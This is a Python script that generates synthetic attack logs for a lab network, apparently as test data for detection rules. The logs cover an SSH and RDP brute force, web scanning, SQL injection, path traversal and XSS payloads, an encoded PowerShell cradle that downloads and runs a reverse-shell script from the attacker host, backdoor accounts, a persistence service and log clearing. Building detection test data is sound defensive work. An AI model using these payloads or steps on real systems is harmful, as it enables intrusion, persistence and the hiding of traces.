"""Generate the sample attack-scenario logs in ``samples/``.

Scenario (all lab addresses, VirtualBox NAT network 192.168.56.0/24):

* 192.168.56.101 (attacker, Kali) scans the web app with gobuster and sqlmap,
  tries SQLi / path traversal / XSS,
* then brute-forces and password-sprays SSH on ``web01``, gets in as
  ``deploy``, spawns a root shell, creates a backdoor user and adds it to sudo,
* then brute-forces RDP on ``WIN10-LAB``, logs in as ``jsmith``, runs an
  encoded PowerShell download cradle, creates ``svc_backup``, adds it to
  Administrators, installs a service and clears the Security log.

Normal user activity from 192.168.56.20 / .21 is mixed in as background noise
so the rules have to separate signal from benign failures.

Run:  python scripts/generate_samples.py
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(1337)
OUT = Path(__file__).resolve().parent.parent / "samples"
ATTACKER = "192.168.56.101"
START = datetime(2026, 11, 20, 2, 55, 0, tzinfo=timezone.utc)


def syslog(ts: datetime, host: str, proc: str, msg: str) -> str:
    return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {host} {proc}[{random.randint(1000, 65000)}]: {msg}"


def auth_log() -> list[str]:
    lines: list[tuple[datetime, str]] = []
    t = START
    # benign noise
    for i in range(12):
        ts = t + timedelta(minutes=random.randint(0, 90), seconds=random.randint(0, 59))
        user = random.choice(["abhi", "priya", "deploy"])
        ip = random.choice(["192.168.56.20", "192.168.56.21"])
        lines.append((ts, syslog(ts, "web01", "sshd",
                                 f"Accepted publickey for {user} from {ip} port {random.randint(40000, 60000)} ssh2")))
    ts = t + timedelta(minutes=5)
    lines.append((ts, syslog(ts, "web01", "sshd",
                             "Failed password for priya from 192.168.56.21 port 50122 ssh2")))  # one typo, benign
    # brute force against root/admin
    t2 = START + timedelta(minutes=20)
    for i in range(14):
        ts = t2 + timedelta(seconds=i * 3)
        lines.append((ts, syslog(ts, "web01", "sshd",
                                 f"Failed password for root from {ATTACKER} port {41000 + i} ssh2")))
    # password spray
    t3 = t2 + timedelta(minutes=2)
    for i, user in enumerate(["admin", "test", "oracle", "ubuntu", "git", "deploy", "deploy"]):
        ts = t3 + timedelta(seconds=i * 7)
        invalid = "invalid user " if user in ("admin", "test", "oracle", "git") else ""
        lines.append((ts, syslog(ts, "web01", "sshd",
                                 f"Failed password for {invalid}{user} from {ATTACKER} port {42000 + i} ssh2")))
    # success
    t4 = t3 + timedelta(minutes=1, seconds=10)
    lines.append((t4, syslog(t4, "web01", "sshd",
                             f"Accepted password for deploy from {ATTACKER} port 42999 ssh2")))
    # post-exploitation
    ts = t4 + timedelta(minutes=1)
    lines.append((ts, syslog(ts, "web01", "sudo",
                             " deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")))
    ts += timedelta(seconds=40)
    lines.append((ts, syslog(ts, "web01", "useradd",
                             "new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash")))
    ts += timedelta(seconds=5)
    lines.append((ts, syslog(ts, "web01", "usermod", "add 'sysupdate' to group 'sudo'")))
    # benign sudo
    ts = START + timedelta(minutes=70)
    lines.append((ts, syslog(ts, "web01", "sudo",
                             "    abhi : TTY=pts/0 ; PWD=/home/abhi ; USER=root ; COMMAND=/usr/bin/apt update")))
    lines.sort(key=lambda x: x[0])
    return [l for _, l in lines]


def access_log() -> list[str]:
    lines: list[tuple[datetime, str]] = []

    def entry(ts, ip, method, path, status, size, ua, ref="-"):
        return (ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S +0000}] "{method} {path} HTTP/1.1" '
                    f'{status} {size} "{ref}" "{ua}"')

    browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
    for i in range(40):
        ts = START + timedelta(seconds=random.randint(0, 5400))
        page = random.choice(["/", "/index.php", "/products.php?id=3", "/about", "/static/app.css",
                              "/static/logo.png", "/login.php", "/contact"])
        lines.append(entry(ts, random.choice(["192.168.56.20", "192.168.56.21"]), "GET", page, 200,
                           random.randint(300, 9000), browser))
    lines.append(entry(START + timedelta(minutes=3), "192.168.56.20", "GET", "/favicon.ico", 404, 0, browser))
    # gobuster
    t = START + timedelta(minutes=8)
    words = ["admin", "backup", ".git", "config", "old", "test", "dev", "uploads", "phpmyadmin", "wp-admin",
             "server-status", ".env", "api", "private", "db", "logs", "tmp", "secret", "cgi-bin", "install",
             "shell", "panel", "dashboard", "console"]
    for i, w in enumerate(words):
        status = 200 if w in ("uploads", "api") else 403 if w == "server-status" else 404
        lines.append(entry(t + timedelta(milliseconds=400 * i), ATTACKER, "GET", f"/{w}", status, 0,
                           "gobuster/3.6"))
    # sqlmap + manual payloads
    t = START + timedelta(minutes=12)
    payloads = [
        "/products.php?id=3%27%20OR%20%271%27%3D%271",
        "/products.php?id=3%20UNION%20ALL%20SELECT%20NULL,NULL,version()--",
        "/products.php?id=3%20AND%20SLEEP(5)",
        "/products.php?id=-1%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables--",
    ]
    for i, p in enumerate(payloads):
        lines.append(entry(t + timedelta(seconds=i * 2), ATTACKER, "GET", p, 200, 1300, "sqlmap/1.8.11#stable (https://sqlmap.org)"))
    lines.append(entry(t + timedelta(minutes=1), ATTACKER, "GET", "/download.php?file=../../../../etc/passwd",
                       200, 2210, "curl/8.5.0"))
    lines.append(entry(t + timedelta(minutes=1, seconds=20), ATTACKER, "GET",
                       "/search.php?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200, 880, "curl/8.5.0"))
    lines.sort(key=lambda x: x[0])
    return [l for _, l in lines]


def windows_events() -> list[dict]:
    ev: list[dict] = []
    host = "WIN10-LAB"

    def add(ts, event_id, **data):
        ev.append({"TimeCreated": ts.isoformat().replace("+00:00", "Z"), "EventID": event_id,
                   "Computer": host, **data})

    # benign interactive logons + one typo
    for i in range(6):
        ts = START + timedelta(minutes=random.randint(0, 80))
        add(ts, 4624, TargetUserName="abhi", IpAddress="127.0.0.1", LogonType=2, WorkstationName=host)
    add(START + timedelta(minutes=4), 4625, TargetUserName="abhi", IpAddress="127.0.0.1", LogonType=2,
        Status="0xC000006D", SubStatus="0xC000006A")
    # RDP brute force / spray
    t = START + timedelta(minutes=35)
    users = ["administrator"] * 8 + ["admin", "jsmith", "guest", "backup", "jsmith"]
    for i, u in enumerate(users):
        add(t + timedelta(seconds=i * 4), 4625, TargetUserName=u, IpAddress=ATTACKER, LogonType=10,
            Status="0xC000006D", SubStatus="0xC000006A", WorkstationName="kali")
    add(t + timedelta(seconds=60), 4740, TargetUserName="administrator", SubjectUserName="WIN10-LAB$")
    t2 = t + timedelta(seconds=80)
    add(t2, 4624, TargetUserName="jsmith", IpAddress=ATTACKER, LogonType=10, WorkstationName="kali")
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101:8000/rev.ps1')"
    enc = base64.b64encode(cradle.encode("utf-16-le")).decode()
    add(t2 + timedelta(seconds=45), 4688, SubjectUserName="jsmith",
        NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        CommandLine=f"powershell.exe -nop -w hidden -enc {enc}", ParentProcessName="C:\\Windows\\explorer.exe")
    add(t2 + timedelta(seconds=46), 4104, ScriptBlockText=cradle, Path="")
    add(t2 + timedelta(minutes=2), 4720, TargetUserName="svc_backup", SubjectUserName="jsmith")
    add(t2 + timedelta(minutes=2, seconds=5), 4732, TargetUserName="Administrators",
        MemberName="CN=svc_backup,CN=Users,DC=lab,DC=local", SubjectUserName="jsmith")
    add(t2 + timedelta(minutes=3), 7045, ServiceName="WinUpdateHelper",
        ImagePath="C:\\Users\\Public\\winupd.exe", ServiceType="user mode service", StartType="auto start",
        AccountName="LocalSystem")
    add(t2 + timedelta(minutes=5), 1102, SubjectUserName="jsmith")
    # benign process
    add(START + timedelta(minutes=50), 4688, SubjectUserName="abhi",
        NewProcessName="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        CommandLine="\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"")
    ev.sort(key=lambda e: e["TimeCreated"])
    return ev


def main() -> None:
    OUT.mkdir(exist_ok=True)
    (OUT / "auth.log").write_text("\n".join(auth_log()) + "\n", encoding="utf-8")
    (OUT / "access.log").write_text("\n".join(access_log()) + "\n", encoding="utf-8")
    (OUT / "windows_security.json").write_text(json.dumps(windows_events(), indent=2) + "\n", encoding="utf-8")
    print(f"Sample logs written to {OUT}")


if __name__ == "__main__":
    main()
